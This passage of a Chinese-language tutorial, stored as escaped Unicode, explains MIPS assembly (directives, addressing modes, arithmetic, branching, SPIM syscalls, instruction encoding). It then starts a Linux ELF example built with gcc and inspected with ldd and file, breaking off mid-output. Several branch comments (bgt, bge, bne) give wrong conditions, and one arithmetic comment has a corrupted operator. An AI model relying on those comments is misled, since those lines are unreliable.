\uff03\u521b\u5efa\u4e00\u4e2a\u521d\u59cb\u503c\u4e3a 3 \u7684\u6574\u6570\u53d8\u91cf array1\uff1a.byte'a'\uff0c'b' \uff03\u521b\u5efa\u4e00\u4e2a\u5143\u7d20\u521d\u59cb\u5316\u7684 2 \u5143\u7d20\u5b57\u7b26\u6570\u7ec4\u5230 a \u548c b array2\uff1a.space 40 #\u5206\u914d 40 \u4e2a\u8fde\u7eed\u5b57\u8282, \u672a\u521d\u59cb\u5316\u7684\u7a7a\u95f4\u53ef\u4ee5\u7528\u4f5c 40 \u4e2a\u5143\u7d20\u7684\u5b57\u7b26\u6570\u7ec4, \u6216\u8005\u662f #10 \u4e2a\u5143\u7d20\u7684\u6574\u6570\u6570\u7ec4. \u8bfb\u53d6/\u5199\u5165 ( Load/Store )\u6307\u4ee4 \u5bf9 RAM \u7684\u8bbf\u95ee, \u4ec5\u5141\u8bb8\u4f7f\u7528\u52a0\u8f7d\u548c\u5b58\u50a8\u6307\u4ee4 ( \u5373 load \u6216\u8005 store ) \u6240\u6709\u5176\u4ed6\u6307\u4ee4\u90fd\u4f7f\u7528\u5bc4\u5b58\u5668\u53c2\u6570 load \uff1a lw register_destination\uff0cRAM_source #\u5c06\u6e90\u5185\u5b58\u5730\u5740\u7684\u5b57 ( 4 \u4e2a\u5b57\u8282 ) \u590d\u5236\u5230\u76ee\u6807\u5bc4\u5b58\u5668,\uff08lw\u4e2d\u7684'w'\u610f\u4e3a'word',\u5373\u8be5\u6570\u636e\u5927\u5c0f\u4e3a4\u4e2a\u5b57\u8282\uff09 lb register_destination\uff0cRAM_source #\u5c06\u6e90\u5185\u5b58\u5730\u5740\u7684\u5b57\u8282\u590d\u5236\u5230\u76ee\u6807\u5bc4\u5b58\u5668\u7684\u4f4e\u4f4d\u5b57\u8282, \u5e76\u5c06\u7b26\u53f7\u6620\u5c04\u5230\u9ad8\u4f4d\u5b57\u8282 ( \u540c\u4e0a, lb \u610f\u4e3a load byte ) store \uff1a sw register_source\uff0cRAM_destination #\u5c06\u6e90\u5bc4\u5b58\u5668\u7684\u5b57\u5b58\u50a8\u5230\u76ee\u6807\u5185\u5b58RAM\u4e2d sb register_source\uff0cRAM_destination #\u5c06\u6e90\u5bc4\u5b58\u5668\u4e2d\u7684\u4f4e\u4f4d\u5b57\u8282\u5b58\u50a8\u5230\u76ee\u6807\u5185\u5b58RAM\u4e2d \u7acb\u5373\u52a0\u8f7d\uff1a li register_destination\uff0cvalue #\u628a\u7acb\u5373\u503c\u52a0\u8f7d\u5230\u76ee\u6807\u5bc4\u5b58\u5668\u4e2d,\u987e\u540d\u601d\u4e49, \u8fd9\u91cc\u7684 li \u610f\u4e3a load immediate, \u5373\u7acb\u5373\u52a0\u8f7d. \u4f8b\u5b50 .data var1: .word 23 # \u7ed9\u53d8\u91cf var1 \u5728\u5185\u5b58\u4e2d\u5f00\u8f9f\u7a7a\u95f4, \u53d8\u91cf\u521d\u59cb\u503c\u4e3a 23 .text __start: lw $t0, var1 # \u5c06\u5185\u5b58\u5355\u5143\u4e2d\u7684\u5185\u5bb9\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668\u4e2d $t0: $t0 = var1 li $t1, 5 # $t1 = 5 (\"\u7acb\u5373\u52a0\u8f7d\") sw $t1, var1 # \u628a\u5bc4\u5b58\u5668$t1\u7684\u5185\u5bb9\u5b58\u5230\u5185\u5b58\u4e2d : var1 = $t1 done \u95f4\u63a5\u548c\u7acb\u5373\u5bfb\u5740 \u4ec5\u7528\u4e8e\u8bfb\u53d6\u548c\u5199\u5165\u6307\u4ee4 *\u76f4\u63a5\u7ed9\u5730\u5740\uff1a* la $t0\uff0cvar1 \u5c06 var1 \u7684\u5185\u5b58\u5730\u5740\uff08\u53ef\u80fd\u662f\u7a0b\u5e8f\u4e2d\u5b9a\u4e49\u7684\u6807\u7b7e\uff09\u590d\u5236\u5230\u5bc4\u5b58\u5668 $t0 \u4e2d *\u95f4\u63a5\u5bfb\u5740, \u5730\u5740\u662f\u5bc4\u5b58\u5668\u7684\u5185\u5bb9, \u7c7b\u4f3c\u6307\u9488\uff1a* lw $t2\uff0c\uff08$t0\uff09 \u5c06 $t0 \u4e2d\u5305\u542b\u7684 RAM \u5730\u5740\u52a0\u8f7d\u5230 $t2 sw $t2\uff0c\uff08$t0\uff09 \u5c06 $t2 \u5bc4\u5b58\u5668\u4e2d\u7684\u5b57\u5b58\u50a8\u5230 $t0 \u4e2d\u5305\u542b\u7684\u5730\u5740\u7684 RAM \u4e2d *\u57fa\u4e8e\u504f\u79fb\u91cf\u7684\u5bfb\u5740\uff1a* lw $t2, 4\uff08$t0\uff09 \u5c06\u5185\u5b58\u5730\u5740 ( $t0 + 4 ) \u7684\u5b57\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668 $t2 \u4e2d \u201c 4 \u201d \u7ed9\u51fa\u4e86\u5bc4\u5b58\u5668 $t0 \u4e2d\u5730\u5740\u7684\u504f\u79fb\u91cf sw $t2\uff0c-12\uff08$t0\uff09 \u5c06\u5bc4\u5b58\u5668 $t2 \u4e2d\u7684\u5b57\u653e\u5230\u5185\u5b58\u5730\u5740\uff08 $t0 - 12 \uff09 \u8d1f\u504f\u79fb\u4e5f\u662f\u53ef\u4ee5\u7684, \u53cd\u5411\u6f02\u79fb\u65b9\u4e0d\u65b9 ? \u6ce8\u610f\uff1a\u57fa\u4e8e \u504f\u79fb\u91cf \u7684\u5bfb\u5740\u7279\u522b\u9002\u7528\u4e8e\uff1a \u6570\u7ec4; \u8bbf\u95ee\u5143\u7d20\u4f5c\u4e3a\u4e0e\u57fa\u5740\u7684\u504f\u79fb\u91cf \u6808; \u6613\u4e8e\u8bbf\u95ee\u504f\u79bb\u6808\u6307\u9488\u6216\u5e27\u6307\u9488\u7684\u5143\u7d20 \u4f8b\u5b50 .data array1: .space 12 # \u5b9a\u4e49\u4e00\u4e2a 12\u5b57\u8282 \u957f\u5ea6\u7684\u6570\u7ec4 array1, \u5bb9\u7eb3 3\u4e2a\u6574\u578b .text __start: la $t0, array1 # \u8ba9 $t0 = \u6570\u7ec4\u9996\u5730\u5740 li $t1, 5 # $t1 = 5 (\"load immediate\") sw $t1, ($t0) # \u6570\u7ec4\u7b2c\u4e00\u4e2a\u5143\u7d20\u8bbe\u7f6e\u4e3a 5; \u7528\u7684\u95f4\u63a5\u5bfb\u5740; array[0] = $1 = 5 li $t1, 13 # $t1 = 13 sw $t1, 4($t0) # \u6570\u7ec4\u7b2c\u4e8c\u4e2a\u5143\u7d20\u8bbe\u7f6e\u4e3a 13; array[1] = $1 = 13 #\u8be5\u6570\u7ec4\u4e2d\u6bcf\u4e2a\u5143\u7d20\u5730\u5740\u76f8\u8ddd\u957f\u5ea6\u5c31\u662f\u81ea\u8eab\u6570\u636e\u7c7b\u578b\u957f\u5ea6\uff0c\u53734\u5b57\u8282\uff0c \u6240\u4ee5\u5bf9\u4e8earray+4\u5c31\u662farray[1] li $t1, -7 # $t1 = -7 sw $t1, 8($t0) # \u7b2c\u4e09\u4e2a\u5143\u7d20\u8bbe\u7f6e\u4e3a -7; #array+8 = \uff08address[array[0])+4\uff09+ 4 = address(array[1]) + 4 = address(array[2]) done \u7b97\u672f\u6307\u4ee4 \u6700\u591a\u4f7f\u75283\u4e2a\u53c2\u6570 \u6240\u6709\u64cd\u4f5c\u6570\u90fd\u662f\u5bc4\u5b58\u5668; \u4e0d\u80fd\u6709\u5185\u5b58\u5730\u5740\u7684\u5b58\u5728 \u64cd\u4f5c\u6570\u5927\u5c0f\u662f\u5b57 ( 4\u4e2a\u5b57\u8282 ), 32\u4f4d = 4 * 8 bit = 4bytes = 1 word add $t0,$t1,$t2 # $t0 = $t1 + $t2;\u6dfb\u52a0\u4e3a\u5e26\u7b26\u53f7\uff082 \u7684\u8865\u7801\uff09\u6574\u6570 sub $t2,$t3,$t4 # $t2 = $t3 \u00d0 $t4 addi $t2,$t3, 5 # $t2 = $t3 + 5; addu $t1,$t6,$t7 # $t1 = $t6 + $t7;\u8ddf\u65e0\u7b26\u53f7\u6570\u90a3\u6837\u76f8\u52a0 subu $t1,$t6,$t7 # $t1 = $t6 - $t7;\u8ddf\u65e0\u7b26\u53f7\u6570\u90a3\u6837\u76f8\u51cf mult $t3,$t4 # \u8fd0\u7b97\u7ed3\u679c\u5b58\u50a8\u5728hi,lo\uff08hi\u9ad8\u4f4d\u6570\u636e\uff0c lo\u5730\u4f4d\u6570\u636e\uff09 div $t5,$t6 # Lo = $t5 / $t6 (\u6574\u6570\u5546) # Hi = $t5 mod $t6 (\u6c42\u4f59\u6570) #\u5546\u6570\u5b58\u653e\u5728 lo, \u4f59\u6570\u5b58\u653e\u5728 hi mfhi $t0 # \u628a\u7279\u6b8a\u5bc4\u5b58\u5668 Hi \u7684\u503c\u79fb\u52a8\u5230 $t0 : $t0 = Hi mflo $t1 # \u628a\u7279\u6b8a\u5bc4\u5b58\u5668 Lo \u7684\u503c\u79fb\u52a8\u5230 $t1: $t1 = Lo #\u4e0d\u80fd\u76f4\u63a5\u83b7\u53d6 hi \u6216 lo\u4e2d\u7684\u503c\uff0c \u9700\u8981mfhi, mflo\u6307\u4ee4\u4f20\u503c\u7ed9\u5bc4\u5b58\u5668 move $t2,$t3 # $t2 = $t3 \u6d41\u7a0b\u63a7\u5236 \u5206\u652f ( if-else ) \u6761\u4ef6\u5206\u652f\u7684\u6bd4\u8f83\u5185\u7f6e\u4e8e\u6307\u4ee4\u4e2d b target \uff03\u65e0\u6761\u4ef6\u5206\u652f,\u76f4\u63a5\u5230\u7a0b\u5e8f\u6807\u7b7e\u76ee\u6807 beq $t0, $t1, target \uff03if $t0 = $ t1, \u5c31\u8df3\u5230\u76ee\u6807 blt $t0, $t1, target \uff03if $t0 <$ t1, \u5c31\u8df3\u5230\u76ee\u6807 ble $t0, $t1, target \uff03if $t0 <= $ t1, \u5c31\u8df3\u5230\u76ee\u6807 bgt $t0, $t1, target \uff03if $t0 $ t1, \u5c31\u8df3\u5230\u76ee\u6807 bge $t0, $t1, target \uff03if $t0 = $ t1, \u5c31\u8df3\u5230\u76ee\u6807 bne $t0, $t1, target #if $t0 < $t1, \u5c31\u8df3\u5230\u76ee\u6807 \u8df3\u8f6c ( while, for, goto ) j target #\u770b\u5230\u5c31\u8df3\uff0c \u4e0d\u7528\u8003\u8651\u4efb\u4f55\u6761\u4ef6 jr $t3 #\u7c7b\u4f3c\u76f8\u5bf9\u5bfb\u5740\uff0c\u8df3\u5230\u8be5\u5bc4\u5b58\u5668\u7ed9\u51fa\u7684\u5730\u5740\u5904 \u5b50\u7a0b\u5e8f\u8c03\u7528 \u5b50\u7a0b\u5e8f\u8c03\u7528\uff1a\u201c \u8df3\u8f6c\u548c\u94fe\u63a5 \u201d \u6307\u4ee4 jal sub_label \uff03\u201c\u8df3\u8f6c\u548c\u94fe\u63a5\u201d \u5c06\u5f53\u524d\u7684\u7a0b\u5e8f\u8ba1\u6570\u5668\u4fdd\u5b58\u5230 $ra \u4e2d \u8df3\u8f6c\u5230 sub_label \u7684\u7a0b\u5e8f\u8bed\u53e5 \u5b50\u7a0b\u5e8f\u8fd4\u56de\uff1a\u201c\u8df3\u8f6c\u5bc4\u5b58\u5668\u201d\u6307\u4ee4 jr $ra \uff03\u201c\u8df3\u8f6c\u5bc4\u5b58\u5668\u201d \u8df3\u8f6c\u5230$ ra\u4e2d\u7684\u5730\u5740\uff08\u7531jal\u6307\u4ee4\u5b58\u50a8\uff09 \u6ce8\u610f\uff1a\u5bc4\u5b58\u5730\u5740\u5b58\u50a8\u5728\u5bc4\u5b58\u5668 $ra \u4e2d; \u5982\u679c\u5b50\u4f8b\u7a0b\u5c06\u8c03\u7528\u5176\u4ed6\u5b50\u4f8b\u7a0b\uff0c\u6216\u8005\u662f\u9012\u5f52\u7684\uff0c\u5219\u8fd4\u56de\u5730\u5740\u5e94\u8be5\u4ece $ra \u590d\u5236\u5230\u6808\u4ee5\u4fdd\u7559\u5b83\uff0c\u56e0\u4e3a jal \u603b\u662f\u5c06\u8fd4\u56de\u5730\u5740\u653e\u5728\u8be5\u5bc4\u5b58\u5668\u4e2d\uff0c\u56e0\u6b64\u5c06\u8986\u76d6\u4e4b\u524d\u7684\u503c \u7cfb\u7edf\u8c03\u7528\u548c I / O\uff08 \u9488\u5bf9 SPIM \u6a21\u62df\u5668 \uff09 \u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u5b9e\u73b0\u4ece\u8f93\u5165/\u8f93\u51fa\u7a97\u53e3\u8bfb\u53d6\u6216\u6253\u5370\u503c\u6216\u5b57\u7b26\u4e32\uff0c\u5e76\u6307\u793a\u7a0b\u5e8f\u7ed3\u675f syscall \u9996\u5148\u5728\u5bc4\u5b58\u5668 $v0 \u548c $a0 - $a1 \u4e2d\u63d0\u4f9b\u9002\u5f53\u7684\u503c \u5bc4\u5b58\u5668 $v0 \u4e2d\u5b58\u50a8\u8fd4\u56de\u7684\u7ed3\u679c\u503c\uff08 \u5982\u679c\u6709\u7684\u8bdd \uff09 \u4e0b\u8868\u5217\u51fa\u4e86\u53ef\u80fd\u7684 \u7cfb\u7edf\u8c03\u7528 \u670d\u52a1\u3002 Service \u670d\u52a1 Code in $v0 \u5bf9\u5e94\u529f\u80fd\u7684\u8c03\u7528\u7801 Arguments \u6240\u9700\u53c2\u6570 Results \u8fd4\u56de\u503c print \u4e00\u4e2a\u6574\u578b\u6570 $v0 = 1 $a0 = \u8981\u6253\u5370\u7684\u6574\u578b\u6570 print \u4e00\u4e2a\u6d6e\u70b9\u6570 $v0 = 2 $f12 = \u8981\u6253\u5370\u7684\u6d6e\u70b9\u6570 print \u53cc\u7cbe\u5ea6\u6570 $v0 = 3 $f12 = \u8981\u6253\u5370\u7684\u53cc\u7cbe\u5ea6\u6570 print \u5b57\u7b26\u4e32 $v0 = 4 $a0 = \u8981\u6253\u5370\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740 \u8bfb\u53d6 ( read ) \u6574\u578b\u6570 $v0 = 5 $v0 = \u8bfb\u53d6\u7684\u6574\u578b\u6570 \u8bfb\u53d6 ( read ) \u6d6e\u70b9\u6570 $v0 = 6 $v0 = \u8bfb\u53d6\u7684\u6d6e\u70b9\u6570 \u8bfb\u53d6 ( read ) \u53cc\u7cbe\u5ea6\u6570 $v0 = 7 $v0 = \u8bfb\u53d6\u7684\u53cc\u7cbe\u5ea6 \u8bfb\u53d6 ( read ) \u5b57\u7b26\u4e32 $v0 = 8 \u5c06\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u5730\u5740\u8d4b\u503c\u7ed9 $a0 ; \u5c06\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u8d4b\u503c\u7ed9 $a1 \u8fd9\u4e2a\u5e94\u8be5\u548c C \u8bed\u8a00\u7684 sbrk() \u51fd\u6570\u4e00\u6837 $v0 = 9 \u9700\u8981\u5206\u914d\u7684\u7a7a\u95f4\u5927\u5c0f\uff08\u5355\u4f4d\u76ee\u6d4b\u662f\u5b57\u8282 bytes\uff09 \u5c06\u5206\u914d\u597d\u7684\u7a7a\u95f4\u9996\u5730\u5740\u7ed9 $v0 exit $v0 =10 \u8fd9\u4e2a\u8fd8\u8981\u8bf4\u5417.....= _ = print_string \u5373 print \u5b57\u7b26\u4e32 \u670d\u52a1\u671f\u671b\u542f\u52a8\u4ee5 null \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002\u6307\u4ee4 .asciiz \u521b\u5efa\u4e00\u4e2a\u4ee5 null \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002 read_int \uff0c read_float \u548c read_double \u670d\u52a1\u8bfb\u53d6\u6574\u884c\u8f93\u5165\uff0c\u5305\u62ec\u6362\u884c\u7b26 \\n \u3002 read_string \u670d\u52a1\u4e0e UNIX \u5e93\u4f8b\u7a0b fgets \u5177\u6709\u76f8\u540c\u7684\u8bed\u4e49\u3002 \u5b83\u5c06\u6700\u591a n-1 \u4e2a\u5b57\u7b26\u8bfb\u5165\u7f13\u51b2\u533a\uff0c\u5e76\u4ee5\u7a7a\u5b57\u7b26\u7ec8\u6b62\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u5f53\u524d\u884c\u4e2d\u5c11\u4e8e n-1 \u4e2a\u5b57\u7b26\uff0c\u5219\u5b83\u4f1a\u8bfb\u53d6\u5e76\u5305\u542b\u6362\u884c\u7b26\uff0c\u5e76\u4f7f\u7528\u7a7a\u5b57\u7b26\u7ec8\u6b62\u8be5\u5b57\u7b26\u4e32\u3002 \u5c31\u662f\u8f93\u5165\u8fc7\u957f\u5c31\u622a\u53d6\uff0c\u8fc7\u77ed\u5c31\u8fd9\u6837\uff0c\u6700\u540e\u90fd\u8981\u52a0\u4e00\u4e2a\u7ec8\u6b62\u7b26\u3002 sbrk \u670d\u52a1\u5c06\u5730\u5740\u8fd4\u56de\u5230\u5305\u542b n \u4e2a\u9644\u52a0\u5b57\u8282\u7684\u5185\u5b58\u5757\u3002\u8fd9\u5c06\u7528\u4e8e\u52a8\u6001\u5185\u5b58\u5206\u914d\u3002 \u9000\u51fa\u670d\u52a1\u4f7f\u7a0b\u5e8f\u505c\u6b62\u8fd0\u884c \u4f8b\u5b50 : \u6253\u5370\u4e00\u4e2a\u5b58\u50a8\u5728 $2 \u7684\u6574\u578b\u6570 li $v0, 1 #\u58f0\u660e\u9700\u8981\u8c03\u7528\u7684\u64cd\u4f5c\u4ee3\u7801\u4e3a 1 ( print_int ), \u7136\u540e\u8d4b\u503c\u7ed9 $v0 move $a0, $t2 #\u628a\u8fd9\u4e2a\u8981\u6253\u5370\u7684\u6574\u578b\u6570\u8d4b\u503c\u7ed9 $a0 syscall #\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u6211\u4eec\u7684\u64cd\u4f5c \u4f8b\u5b50 : \u8bfb\u53d6\u4e00\u4e2a\u6570\uff0c\u5e76\u4e14\u5b58\u50a8\u5230\u5185\u5b58\u4e2d\u7684 int_value \u53d8\u91cf\u4e2d masm li $v0, 5 #\u58f0\u660e\u9700\u8981\u8c03\u7528\u7684\u64cd\u4f5c\u4ee3\u7801\u4e3a 5 ( read_int ), \u7136\u540e\u8d4b\u503c\u7ed9 $v0 syscall #\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u6211\u4eec\u7684\u64cd\u4f5c, \u7136\u540e $v0 = 5 sw $v0, int_value #\u901a\u8fc7\u5199\u5165\uff08store_word)\u6307\u4ee4 \u5c06 $v0 \u7684\u503c\uff085\uff09\u5b58\u5165\u5185\u5b58\u4e2d \u4f8b\u5b50 : \u6253\u5370\u4e00\u4e2a\u5b57\u7b26\u4e32 ( \u8fd9\u662f\u5b8c\u6574\u7684\uff0c\u5176\u5b9e\u4e0a\u9762\u4f8b\u5b50\u90fd\u53ef\u4ee5\u76f4\u63a5\u66ff\u6362 main: \u90e8\u5206\uff0c\u90fd\u80fd\u76f4\u63a5\u8fd0\u884c ) .data string1 .asciiz \"Print this.\\n\" # \u5b57\u7b26\u4e32\u53d8\u91cf\u58f0\u660e # .asciiz \u6307\u4ee4\u4f7f\u5b57\u7b26\u4e32 null \u7ec8\u6b62 .text main: li $v0, 4 # \u5c06\u9002\u5f53\u7684\u7cfb\u7edf\u8c03\u7528\u4ee3\u7801\u52a0\u8f7d\u5230\u5bc4\u5b58\u5668 $v0 \u4e2d # \u6253\u5370\u5b57\u7b26\u4e32\uff0c \u8d4b\u503c\u5bf9\u5e94\u7684\u64cd\u4f5c\u4ee3\u7801 $v0 = 4 la $a0, string1 # \u5c06\u8981\u6253\u5370\u7684\u5b57\u7b26\u4e32\u5730\u5740\u8d4b\u503c $a0 = address(string1) syscall # \u8ba9\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u6253\u5370\u64cd\u4f5c \u8981\u6307\u793a\u7a0b\u5e8f\u7ed3\u675f, \u5e94\u8be5\u9000\u51fa\u7cfb\u7edf\u8c03\u7528, \u6240\u4ee5\u6700\u540e\u4e00\u884c\u4ee3\u7801\u5e94\u8be5\u662f\u8fd9\u4e2a : li $v0, 10\u3000\u3000\u3000 #\u5bf9\u7740\u4e0a\u9762\u7684\u8868, \u4e0d\u7528\u8bf4\u4e86\u5427 syscall # \u8ba9\u64cd\u4f5c\u7cfb\u7edf\u7ed3\u675f\u8fd9\u4e00\u5207\u5427 ! \u8865\u5145 : MIPS \u6307\u4ee4\u683c\u5f0f R\u683c\u5f0f 6 5 5 5 5 6 op rs rt rd shamt funct \u7528\u5904\uff1a \u5bc4\u5b58\u5668 - \u5bc4\u5b58\u5668 ALU \u64cd\u4f5c \u8bfb\u5199\u4e13\u7528\u5bc4\u5b58\u5668 I\u683c\u5f0f 6 5 5 16 op rs rt \u7acb\u5373\u6570\u64cd\u4f5c \u7528\u5904\uff1a \u52a0\u8f7d/\u5b58\u50a8 \u5b57\u8282\uff0c\u534a\u5b57\uff0c\u5b57\uff0c\u53cc\u5b57 \u6761\u4ef6\u5206\u652f\uff0c\u8df3\u8f6c\uff0c\u8df3\u8f6c\u5e76\u94fe\u63a5\u5bc4\u5b58\u5668 J\u683c\u5f0f 6 26 op \u8df3\u8f6c\u5730\u5740 \u7528\u5904\uff1a \u8df3\u8f6c\uff0c\u8df3\u8f6c\u5e76\u94fe\u63a5 \u9677\u9631\u548c\u4ece\u5f02\u5e38\u4e2d\u8fd4\u56de \u5404\u5b57\u6bb5\u542b\u4e49\uff1a op : \u6307\u4ee4\u57fa\u672c\u64cd\u4f5c\uff0c\u79f0\u4e3a\u64cd\u4f5c\u7801\u3002 rs : \u7b2c\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u3002 rt : \u7b2c\u4e8c\u4e2a\u6e90\u64cd\u4f5c\u6570\u5bc4\u5b58\u5668\u3002 rd : \u5b58\u653e\u64cd\u4f5c\u7ed3\u679c\u7684\u76ee\u7684\u64cd\u4f5c\u6570\u3002 shamt : \u4f4d\u79fb\u91cf\uff1b funct : \u51fd\u6570\uff0c\u8fd9\u4e2a\u5b57\u6bb5\u9009\u62e9 op \u64cd\u4f5c\u7684\u67d0\u4e2a\u7279\u5b9a\u53d8\u4f53\u3002 \u4f8b\uff1a add $t0,$s0,$s1 \u8868\u793a $t0=$s0+$s1 ,\u5373 16 \u53f7\u5bc4\u5b58\u5668\uff08 s0 ) \u7684\u5185\u5bb9\u548c 17 \u53f7\u5bc4\u5b58\u5668 ( s1 ) \u7684\u5185\u5bb9\u76f8\u52a0\uff0c\u7ed3\u679c\u653e\u5230 8 \u53f7\u5bc4\u5b58\u5668 ( t0 )\u3002 \u6307\u4ee4\u5404\u5b57\u6bb5\u7684\u5341\u8fdb\u5236\u8868\u793a\u4e3a\uff1a 0 16 17 8 0 32 op = 0 \u548c funct = 32 \u8868\u793a\u8fd9\u662f\u52a0\u6cd5\uff0c 16 = $s0 \u8868\u793a\u7b2c\u4e00\u4e2a\u6e90\u64cd\u4f5c\u6570 ( rs ) \u5728 16 \u53f7\u5bc4\u5b58\u5668\u91cc\uff0c 17 = $s1 \u8868\u793a\u7b2c\u4e8c\u4e2a\u6e90\u64cd\u4f5c\u6570 ( rt ) \u5728 17 \u53f7\u5bc4\u5b58\u5668\u91cc\uff0c 8 = $t0 \u8868\u793a\u76ee\u7684\u64cd\u4f5c\u6570 ( rd ) \u5728 8 \u53f7\u5bc4\u5b58\u5668\u91cc\u3002 \u628a\u5404\u5b57\u6bb5\u5199\u6210\u4e8c\u8fdb\u5236\uff0c\u4e3a\uff1a 000000 10000 10001 01000 00000 100000 \u8fd9\u5c31\u662f\u4e0a\u8ff0\u6307\u4ee4\u7684\u673a\u5668\u7801\uff08 machine code ), \u53ef\u4ee5\u770b\u51fa\u662f\u5f88\u6709\u89c4\u5219\u6027\u7684\u3002 \u8865\u5145 : MIPS \u5e38\u7528\u6307\u4ee4\u96c6 lb/lh/lw : \u4ece\u5b58\u50a8\u5668\u4e2d\u8bfb\u53d6\u4e00\u4e2a byte / half word / word \u7684\u6570\u636e\u5230\u5bc4\u5b58\u5668\u4e2d. \u5982 lb $1, 0($2) sb/sh/sw : \u628a\u4e00\u4e2a byte / half word / word \u7684\u6570\u636e\u4ece\u5bc4\u5b58\u5668\u5b58\u50a8\u5230\u5b58\u50a8\u5668\u4e2d. \u5982 sb $1, 0($2) add/addu : \u628a\u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u52a0 add $1,$2,$3($1=$2+$3) ; u \u4e3a\u4e0d\u5e26\u7b26\u53f7\u52a0 addi/addiu : \u628a\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u52a0\u4e0a\u4e00\u4e2a\u7acb\u5373\u6570 add $1,$2,#3($1=$2+3) ; u \u4e3a\u4e0d\u5e26\u7b26\u53f7\u52a0 sub/subu \uff1a\u628a\u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u51cf div/divu : \u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u9664 mul/mulu : \u4e24\u4e2a\u5b9a\u70b9\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u76f8\u4e58 and/andi : \u4e0e\u8fd0\u7b97\uff0c\u4e24\u4e2a\u5bc4\u5b58\u5668\u4e2d\u7684\u5185\u5bb9\u76f8\u4e0e and $1,$2,$3($1=$2 & $3) ;i\u4e3a\u7acb\u5373\u6570\u3002 or/ori : \u6216\u8fd0\u7b97\u3002 xor/xori : \u5f02\u6216\u8fd0\u7b97\u3002 beq/beqz/benz/bne : \u6761\u4ef6\u8f6c\u79fb eq \u76f8\u7b49\uff0cz \u96f6\uff0cne \u4e0d\u7b49 j/jr/jal/jalr : j \u76f4\u63a5\u8df3\u8f6c\uff1bjr \u4f7f\u7528\u5bc4\u5b58\u5668\u8df3\u8f6c lui : \u628a\u4e00\u4e2a 16 \u4f4d\u7684\u7acb\u5373\u6570\u586b\u5165\u5230\u5bc4\u5b58\u5668\u7684\u9ad8 16 \u4f4d\uff0c\u4f4e 16 \u4f4d\u8865\u96f6 sll/srl : \u903b\u8f91 \u5de6\u79fb / \u53f3\u79fb sll $1,$2,#2 slt/slti/sltui : \u5982\u679c $2 \u7684\u503c\u5c0f\u4e8e $3 \uff0c\u90a3\u4e48\u8bbe\u7f6e $1 \u7684\u503c\u4e3a 1,\u5426\u5219\u8bbe\u7f6e $1 \u7684\u503c\u4e3a 0 slt $1,$2,$3 mov/movz/movn : \u590d\u5236\uff0cn \u4e3a\u8d1f\uff0cz \u4e3a\u96f6 mov $1,$2; movz $1,$2,$3 ( $3 \u4e3a\u96f6\u5219\u590d\u5236 $2 \u5230 $1 ) trap : \u6839\u636e\u5730\u5740\u5411\u91cf\u8f6c\u5165\u7ba1\u6001 eret : \u4ece\u5f02\u5e38\u4e2d\u8fd4\u56de\u5230\u7528\u6237\u6001 Linux ELF \u4e00\u4e2a\u5b9e\u4f8b elfdemo.o ELF \u6587\u4ef6\u7ed3\u6784 \u53c2\u8003\u8d44\u6599 \u4e00\u4e2a\u5b9e\u4f8b \u5728 1.5.1\u8282 C\u8bed\u8a00\u57fa\u7840 \u4e2d\u6211\u4eec\u770b\u5230\u4e86\u4ece\u6e90\u4ee3\u7801\u5230\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5168\u8fc7\u7a0b\uff0c\u73b0\u5728\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u4f8b\u5b50\u3002 #include<stdio.h> int global_init_var = 10; int global_uninit_var; void func(int sum) { printf(\"%d\\n\", sum); } void main(void) { static int local_static_init_var = 20; static int local_static_uninit_var; int local_init_val = 30; int local_uninit_var; func(global_init_var + local_init_val + local_static_init_var ); } \u7136\u540e\u5206\u522b\u6267\u884c\u4e0b\u5217\u547d\u4ee4\u751f\u6210\u4e09\u4e2a\u6587\u4ef6\uff1a gcc -m32 -c elfDemo.c -o elfDemo.o gcc -m32 elfDemo.c -o elfDemo.out gcc -m32 -static elfDemo.c -o elfDemo_static.out \u4f7f\u7528 ldd \u547d\u4ee4\u6253\u5370\u6240\u4f9d\u8d56\u7684\u5171\u4eab\u5e93\uff1a $ ldd elfDemo.out linux-gate.so.1 (0xf77b1000) libc.so.6 => /usr/lib32/libc.so.6 (0xf7597000) /lib/ld-linux.so.2 => /usr/lib/ld-linux.so.2 (0xf77b3000) $ ldd elfDemo_static.out not a dynamic executable elfDemo_static.out \u91c7\u7528\u4e86\u9759\u6001\u94fe\u63a5\u7684\u65b9\u5f0f\u3002 \u4f7f\u7528 file \u547d\u4ee4\u67e5\u770b\u76f8\u5e94\u7684\u6587\u4ef6\u683c\u5f0f\uff1a $ file elfDemo.o elfDemo.o: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped $ file elfDemo.out elfDemo.out: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=50036015393a99344897cbf34099256c3793e172, not stripped $ file elfDemo_static.out elfDemo_static.out: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=276c839c20b4c187e4b486cf96d82a90c40f4dae, not stripped $ file -L /usr/lib32/libc.so.6 /usr/lib32/libc.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /usr/lib32/ld-linux.so.2, 